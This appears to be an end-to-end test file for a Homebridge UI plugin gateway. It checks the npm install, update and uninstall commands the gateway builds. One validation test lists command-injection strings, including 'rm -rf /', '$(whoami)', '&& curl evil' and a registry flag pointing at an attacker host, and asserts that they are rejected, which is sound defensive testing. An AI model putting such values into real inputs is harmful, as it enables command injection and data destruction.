@@ -1,0 +1,507 @@
+import type { NestFastifyApplication } from '@nestjs/platform-fastify'
+import type { TestingModule } from '@nestjs/testing'
+
+import { EventEmitter } from 'node:events'
+import { platform } from 'node:os'
+import { resolve } from 'node:path'
+import process from 'node:process'
+
+import { FastifyAdapter } from '@nestjs/platform-fastify'
+import { Test } from '@nestjs/testing'
+import { copy, remove } from 'fs-extra'
+import { throwError } from 'rxjs'
+import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest'
+
+import { ConfigService } from '../../src/core/config/config.service.js'
+import { NodePtyService } from '../../src/core/node-pty/node-pty.service.js'
+import { PluginsGateway } from '../../src/modules/plugins/plugins.gateway.js'
+import { PluginsModule } from '../../src/modules/plugins/plugins.module.js'
+import { PluginsService } from '../../src/modules/plugins/plugins.service.js'
+import { testStoragePath } from '../storage-path.js'
+
+describe('PluginsGateway (e2e)', { timeout: 10_000 }, () => {
+  let app: NestFastifyApplication
+
+  let authFilePath: string
+  let secretsFilePath: string
+  let pluginsPath: string
+
+  let configService: ConfigService
+  let pluginsService: PluginsService
+  let pluginsGateway: PluginsGateway
+  let client: EventEmitter
+
+  let win32NpmPath: string
+  const isWin32 = platform() === 'win32'
+
+  const nodePtyService = {
+    spawn: vi.fn(),
+  }
+
+  beforeAll(async () => {
+    process.env.UIX_BASE_PATH = resolve(__dirname, '../../')
+    process.env.UIX_STORAGE_PATH = testStoragePath
+    process.env.UIX_CONFIG_PATH = resolve(process.env.UIX_STORAGE_PATH, 'config.json')
+    process.env.UIX_CUSTOM_PLUGIN_PATH = resolve(process.env.UIX_STORAGE_PATH, 'plugins/node_modules')
+
+    authFilePath = resolve(process.env.UIX_STORAGE_PATH, 'auth.json')
+    secretsFilePath = resolve(process.env.UIX_STORAGE_PATH, '.uix-secrets')
+    pluginsPath = process.env.UIX_CUSTOM_PLUGIN_PATH
+
+    // Setup test config
+    await copy(resolve(__dirname, '../mocks', 'config.json'), process.env.UIX_CONFIG_PATH)
+
+    // Setup test auth file
+    await copy(resolve(__dirname, '../mocks', 'auth.json'), authFilePath)
+    await copy(resolve(__dirname, '../mocks', '.uix-secrets'), secretsFilePath)
+
+    await remove(pluginsPath)
+    await copy(resolve(__dirname, '../mocks', 'plugins'), pluginsPath)
+
+    const moduleFixture: TestingModule = await Test.createTestingModule({
+      imports: [PluginsModule],
+    }).overrideProvider(NodePtyService).useValue(nodePtyService).compile()
+
+    app = moduleFixture.createNestApplication<NestFastifyApplication>(new FastifyAdapter())
+
+    await app.init()
+    await app.getHttpAdapter().getInstance().ready()
+
+    configService = app.get(ConfigService)
+    pluginsService = app.get(PluginsService)
+    pluginsGateway = app.get(PluginsGateway)
+
+    // Isolate plugin discovery to the test plugin path only
+    ;(pluginsService as any)._paths = [pluginsPath]
+
+    win32NpmPath = (pluginsService as any).getNpmPath()[0]
+  })
+
+  beforeEach(async () => {
+    vi.resetAllMocks()
+
+    // create client
+    client = new EventEmitter()
+
+    vi.spyOn(client, 'emit')
+    vi.spyOn(client, 'on')
+
+    // Ensure config is correct
+    configService.ui.sudo = false
+    configService.customPluginPath = pluginsPath
+
+    // Keep existing command tests independent of the npm version running the suite.
+    // npm 12 behavior has explicit coverage below.
+    ;(pluginsService as any).npmMajorVersion = 11
+    // Nor spawn `npm root -g` for the write-access pre-check
+    ;(pluginsService as any).npmGlobalRootPromise = Promise.resolve(pluginsPath)
+
+    // Keep the suite off the network and away from the developer's real npm
+    // cache. The mock plugins are not on the registry, so a failed lookup is
+    // what these tests would get live anyway (versions fall back to "latest").
+    vi.spyOn(pluginsService as any, 'cleanNpmCache').mockResolvedValue(undefined)
+    vi.spyOn((pluginsService as any).httpService, 'get').mockReturnValue(throwError(() => new Error('offline')))
+    vi.spyOn((pluginsService as any).httpService, 'head').mockReturnValue(throwError(() => new Error('offline')))
+  })
+
+  it('ON /plugins/install', async () => {
+    const mockSpawn = vi.spyOn(nodePtyService, 'spawn')
+      .mockImplementation(() => {
+        const term = {
+          onData: vi.fn(),
+          onExit: vi.fn(),
+          kill: vi.fn(),
+        }
+        setTimeout(() => {
+          term.onData.mock.calls[0]?.[0]('some log from terminal')
+          term.onExit.mock.calls[0]?.[0]({ exitCode: 0 })
+        }, 10)
+        return term
+      })
+
+    await pluginsGateway.installPlugin(client, { name: 'homebridge-mock-plugin' })
+
+    // Expect the npm command to be spawned
+    const expectedCmd = isWin32 ? win32NpmPath : 'npm'
+    const expectedArgs = isWin32
+      ? ['install', '-g', '--omit=dev', 'homebridge-mock-plugin@latest']
+      : ['install', '--omit=dev', 'homebridge-mock-plugin@latest']
+    expect(mockSpawn).toHaveBeenCalledWith(expectedCmd, expectedArgs, expect.anything())
+
+    // Expect the terminal logs to be sent to the client
+    expect(client.emit).toHaveBeenCalledWith('stdout', expect.stringContaining('some log from terminal'))
+
+    // Expect the method to let the client know the command succeeded
+    expect(client.emit).toHaveBeenCalledWith('stdout', expect.stringContaining('Operation succeeded!'))
+  })
+
+  it('ON /plugins/install (npm 12 allow scripts)', async () => {
+    const allowScriptsSpy = vi.spyOn(pluginsService as any, 'getAllowedInstallScripts')
+      .mockResolvedValue({
+        allowed: ['homebridge-mock-plugin', 'ffmpeg-for-homebridge'],
+        withScripts: ['ffmpeg-for-homebridge'],
+      })
+    const mockSpawn = vi.spyOn(nodePtyService, 'spawn')
+      .mockImplementation(() => {
+        const term = {
+          onData: vi.fn(),
+          onExit: vi.fn(),
+          kill: vi.fn(),
+        }
+        setTimeout(() => {
+          term.onExit.mock.calls[0]?.[0]({ exitCode: 0 })
+        }, 10)
+        return term
+      })
+
+    try {
+      await pluginsGateway.installPlugin(client, { name: 'homebridge-mock-plugin', version: '3.2.5' })
+
+      // npm only accepts --allow-scripts for global installs; a project-scoped
+      // install fails with EALLOWSCRIPTS if it is passed, so the flag is only
+      // added when installing globally (which this path does on Windows).
+      const expectedCmd = isWin32 ? win32NpmPath : 'npm'
+      const expectedArgs = isWin32
+        ? ['install', '-g', '--omit=dev', '--allow-scripts=homebridge-mock-plugin,ffmpeg-for-homebridge', 'homebridge-mock-plugin@3.2.5']
+        : ['install', '--omit=dev', 'homebridge-mock-plugin@3.2.5']
+      expect(mockSpawn).toHaveBeenCalledWith(expectedCmd, expectedArgs, expect.anything())
+
+      const expectedNotice = isWin32
+        ? 'Allowing install scripts for: homebridge-mock-plugin, ffmpeg-for-homebridge.'
+        : 'npm only accepts --allow-scripts for global installs'
+      expect(client.emit).toHaveBeenCalledWith('stdout', expect.stringContaining(expectedNotice))
+    } finally {
+      allowScriptsSpy.mockRestore()
+    }
+  })
+
+  it('ON /plugins/install (custom version)', async () => {
+    const mockSpawn = vi.spyOn(nodePtyService, 'spawn')
+      .mockImplementation(() => {
+        const term = {
+          onData: vi.fn(),
+          onExit: vi.fn(),
+          kill: vi.fn(),
+        }
+        setTimeout(() => {
+          term.onData.mock.calls[0]?.[0]('some log from terminal')
+          term.onExit.mock.calls[0]?.[0]({ exitCode: 0 })
+        }, 10)
+        return term
+      })
+
+    await pluginsGateway.installPlugin(client, { name: 'homebridge-mock-plugin', version: '3.2.5' })
+
+    // Expect the npm command to be spawned
+    const expectedCmd = isWin32 ? win32NpmPath : 'npm'
+    const expectedArgs = isWin32
+      ? ['install', '-g', '--omit=dev', 'homebridge-mock-plugin@3.2.5']
+      : ['install', '--omit=dev', 'homebridge-mock-plugin@3.2.5']
+    expect(mockSpawn).toHaveBeenCalledWith(expectedCmd, expectedArgs, expect.anything())
+
+    // Expect the terminal logs to be sent to the client
+    expect(client.emit).toHaveBeenCalledWith('stdout', expect.stringContaining('some log from terminal'))
+
+    // Expect the method to let the client know the command succeeded
+    expect(client.emit).toHaveBeenCalledWith('stdout', expect.stringContaining('Operation succeeded!'))
+  })
+
+  it('ON /plugins/install (sudo)', { timeout: 30_000 }, async () => {
+    // Sudo does not work on windows
+    if (platform() === 'win32') {
+      return
+    }
+
+    // Enable sudo
+    configService.ui.sudo = true
+
+    const mockSpawn = vi.spyOn(nodePtyService, 'spawn')
+      .mockImplementation(() => {
+        const term = {
+          onData: vi.fn(),
+          onExit: vi.fn(),
+          kill: vi.fn(),
+        }
+        setTimeout(() => {
+          term.onExit.mock.calls[0]?.[0]({ exitCode: 0 })
+        }, 10)
+        return term
+      })
+
+    await pluginsGateway.installPlugin(client, { name: 'homebridge-mock-plugin', version: 'latest' })
+
+    // Expect the npm command to be spawned with sudo
+    expect(mockSpawn).toHaveBeenCalledWith('sudo', ['-E', '-n', 'npm', 'install', '--omit=dev', 'homebridge-mock-plugin@latest'], expect.anything())
+
+    // Expect the method to let the client know the command succeeded
+    expect(client.emit).toHaveBeenCalledWith('stdout', expect.stringContaining('Operation succeeded!'))
+  })
+
+  it('ON /plugins/install (fail)', async () => {
+    const mockSpawn = vi.spyOn(nodePtyService, 'spawn')
+      .mockImplementation(() => {
+        const term = {
+          onData: vi.fn(),
+          onExit: vi.fn(),
+          kill: vi.fn(),
+        }
+        setTimeout(() => {
+          term.onExit.mock.calls[0]?.[0]({ exitCode: 1 })
+        }, 10)
+        return term
+      })
+
+    try {
+      await pluginsGateway.installPlugin(client, { name: 'homebridge-mock-plugin', version: 'latest' })
+    } catch (e) {}
+
+    // Expect the npm command to be spawned
+    const expectedCmd = isWin32 ? win32NpmPath : 'npm'
+    const expectedArgs = isWin32
+      ? ['install', '-g', '--omit=dev', 'homebridge-mock-plugin@latest']
+      : ['install', '--omit=dev', 'homebridge-mock-plugin@latest']
+    expect(mockSpawn).toHaveBeenCalledWith(expectedCmd, expectedArgs, expect.anything())
+
+    // Expect the method to let the client know the operation failed
+    expect(client.emit).toHaveBeenCalledWith('stdout', expect.stringContaining('Operation failed'))
+  })
+
+  it('ON /plugins/uninstall', async () => {
+    const mockSpawn = vi.spyOn(nodePtyService, 'spawn')
+      .mockImplementation(() => {
+        const term = {
+          onData: vi.fn(),
+          onExit: vi.fn(),
+          kill: vi.fn(),
+        }
+        setTimeout(() => {
+          term.onExit.mock.calls[0]?.[0]({ exitCode: 0 })
+        }, 10)
+        return term
+      })
+
+    try {
+      await pluginsGateway.uninstallPlugin(client, { name: 'homebridge-mock-plugin' })
+    } catch (e) {}
+
+    // Expect the npm command to be spawned
+    const expectedCmd = isWin32 ? win32NpmPath : 'npm'
+    const expectedArgs = isWin32
+      ? ['uninstall', '-g', 'homebridge-mock-plugin']
+      : ['uninstall', 'homebridge-mock-plugin']
+    expect(mockSpawn).toHaveBeenCalledWith(expectedCmd, expectedArgs, expect.anything())
+
+    // Expect the method to let the client know the command succeeded
+    expect(client.emit).toHaveBeenCalledWith('stdout', expect.stringContaining('Operation succeeded!'))
+  })
+
+  it('ON /plugins/uninstall (prevent self uninstall)', async () => {
+    const mockSpawn = vi.spyOn(nodePtyService, 'spawn')
+      .mockImplementation(() => {
+        const term = {
+          onData: vi.fn(),
+          onExit: vi.fn(),
+          kill: vi.fn(),
+        }
+        setTimeout(() => {
+          term.onExit.mock.calls[0]?.[0]({ exitCode: 0 })
+        }, 10)
+        return term
+      })
+
+    try {
+      await pluginsGateway.uninstallPlugin(client, { name: '@mp-consulting/homebridge-config-glass-ui' })
+    } catch (e) {}
+
+    // Expect the npm command not to have to be spawned
+    expect(mockSpawn).not.toHaveBeenCalled()
+
+    // Expect the method to let the client know the command succeeded
+    expect(client.emit).toHaveBeenCalledWith('stdout', expect.stringContaining('Cannot uninstall the Homebridge Glass UI'))
+  })
+
+  it('ON /plugins/update', async () => {
+    const mockSpawn = vi.spyOn(nodePtyService, 'spawn')
+      .mockImplementation(() => {
+        const term = {
+          onData: vi.fn(),
+          onExit: vi.fn(),
+          kill: vi.fn(),
+        }
+        setTimeout(() => {
+          term.onExit.mock.calls[0]?.[0]({ exitCode: 0 })
+        }, 10)
+        return term
+      })
+
+    try {
+      await pluginsGateway.updatePlugin(client, { name: 'homebridge-mock-plugin', version: 'latest' })
+    } catch (e) {}
+
+    // Expect the npm command to be spawned
+    const expectedCmd = isWin32 ? win32NpmPath : 'npm'
+    const expectedArgs = isWin32
+      ? ['install', '-g', '--omit=dev', 'homebridge-mock-plugin@latest']
+      : ['install', '--omit=dev', 'homebridge-mock-plugin@latest']
+    expect(mockSpawn).toHaveBeenCalledWith(expectedCmd, expectedArgs, expect.anything())
+
+    // Expect the method to let the client know the command succeeded
+    expect(client.emit).toHaveBeenCalledWith('stdout', expect.stringContaining('Operation succeeded!'))
+  })
+
+  it('ON /plugins/update (custom version)', async () => {
+    const mockSpawn = vi.spyOn(nodePtyService, 'spawn')
+      .mockImplementation(() => {
+        const term = {
+          onData: vi.fn(),
+          onExit: vi.fn(),
+          kill: vi.fn(),
+        }
+        setTimeout(() => {
+          term.onExit.mock.calls[0]?.[0]({ exitCode: 0 })
+        }, 10)
+        return term
+      })
+
+    try {
+      await pluginsGateway.updatePlugin(client, { name: 'homebridge-mock-plugin', version: '3.4.6' })
+    } catch (e) {}
+
+    // Expect the npm command to be spawned
+    const expectedCmd = isWin32 ? win32NpmPath : 'npm'
+    const expectedArgs = isWin32
+      ? ['install', '-g', '--omit=dev', 'homebridge-mock-plugin@3.4.6']
+      : ['install', '--omit=dev', 'homebridge-mock-plugin@3.4.6']
+    expect(mockSpawn).toHaveBeenCalledWith(expectedCmd, expectedArgs, expect.anything())
+
+    // Expect the method to let the client know the command succeeded
+    expect(client.emit).toHaveBeenCalledWith('stdout', expect.stringContaining('Operation succeeded!'))
+  })
+
+  it('ON /plugins/homebridge-update', async () => {
+    // Mock get homebridge package
+    pluginsService.getHomebridgePackage = async () => {
+      return {
+        name: 'homebridge',
+        private: false,
+        publicPackage: true,
+        installPath: pluginsPath,
+      }
+    }
+
+    const mockSpawn = vi.spyOn(nodePtyService, 'spawn')
+      .mockImplementation(() => {
+        const term = {
+          onData: vi.fn(),
+          onExit: vi.fn(),
+          kill: vi.fn(),
+        }
+        setTimeout(() => {
+          term.onExit.mock.calls[0]?.[0]({ exitCode: 0 })
+        }, 10)
+        return term
+      })
+
+    try {
+      await pluginsGateway.homebridgeUpdate(client, {})
+    } catch (e) {}
+
+    // Expect the npm command to be spawned
+    const expectedCmd = isWin32 ? win32NpmPath : 'npm'
+    const expectedArgs = isWin32
+      ? ['install', '--omit=dev', '-g', 'homebridge@latest']
+      : ['install', '--omit=dev', 'homebridge@latest']
+    expect(mockSpawn).toHaveBeenCalledWith(expectedCmd, expectedArgs, expect.anything())
+
+    // Expect the method to let the client know the command succeeded
+    expect(client.emit).toHaveBeenCalledWith('stdout', expect.stringContaining('Operation succeeded!'))
+  })
+
+  it('ON /plugins/homebridge-update (custom version)', async () => {
+    // Mock get homebridge package
+    pluginsService.getHomebridgePackage = async () => {
+      return {
+        name: 'homebridge',
+        private: false,
+        publicPackage: true,
+        installPath: pluginsPath,
+      }
+    }
+
+    const mockSpawn = vi.spyOn(nodePtyService, 'spawn')
+      .mockImplementation(() => {
+        const term = {
+          onData: vi.fn(),
+          onExit: vi.fn(),
+          kill: vi.fn(),
+        }
+        setTimeout(() => {
+          term.onExit.mock.calls[0]?.[0]({ exitCode: 0 })
+        }, 10)
+        return term
+      })
+
+    try {
+      await pluginsGateway.homebridgeUpdate(client, { version: '1.2.5' })
+    } catch (e) {}
+
+    // Expect the npm command to be spawned
+    const expectedCmd = isWin32 ? win32NpmPath : 'npm'
+    const expectedArgs = isWin32
+      ? ['install', '--omit=dev', '-g', 'homebridge@1.2.5']
+      : ['install', '--omit=dev', 'homebridge@1.2.5']
+    expect(mockSpawn).toHaveBeenCalledWith(expectedCmd, expectedArgs, expect.anything())
+    // Expect the method to let the client know the command succeeded
+    expect(client.emit).toHaveBeenCalledWith('stdout', expect.stringContaining('Operation succeeded!'))
+  })
+
+  describe('PluginActionDto validation', () => {
+    it('rejects a malicious plugin version string via the class-validator regex', async () => {
+      const { plainToInstance } = await import('class-transformer')
+      const { validate } = await import('class-validator')
+      const { PluginActionDto } = await import('../../src/modules/plugins/plugins.dto.js')
+
+      // Versions containing characters that would let a malicious caller
+      // smuggle an npm CLI flag past the install path. The hb-service
+      // CLI gate uses the same regex; this asserts the in-UI DTO does
+      // the same.
+      const bad = [
+        '--registry=http://attacker/',
+        '1.0.0; rm -rf /',
+        '1.0.0$(whoami)',
+        '1.0.0`id`',
+        '1.0.0 && curl evil',
+      ]
+      for (const version of bad) {
+        const dto = plainToInstance(PluginActionDto, {
+          name: 'homebridge-mock-plugin',
+          version,
+        })
+        const errors = await validate(dto)
+        const versionError = errors.find(e => e.property === 'version')
+        expect(versionError, `expected version "${version}" to fail validation`).toBeDefined()
+      }
+    })
+
+    it('accepts the canonical semver / range shapes', async () => {
+      const { plainToInstance } = await import('class-transformer')
+      const { validate } = await import('class-validator')
+      const { PluginActionDto } = await import('../../src/modules/plugins/plugins.dto.js')
+
+      const good = ['latest', '1.0.0', '1.0.0-beta.1', '^1.0.0', '~1.0.0', '>=1.0.0', '*']
+      for (const version of good) {
+        const dto = plainToInstance(PluginActionDto, {
+          name: 'homebridge-mock-plugin',
+          version,
+        })
+        const errors = await validate(dto)
+        const versionError = errors.find(e => e.property === 'version')
+        expect(versionError, `expected version "${version}" to pass validation`).toBeUndefined()
+      }
+    })
+  })
+
+  afterAll(async () => {
+    await app.close()
+  })
+})
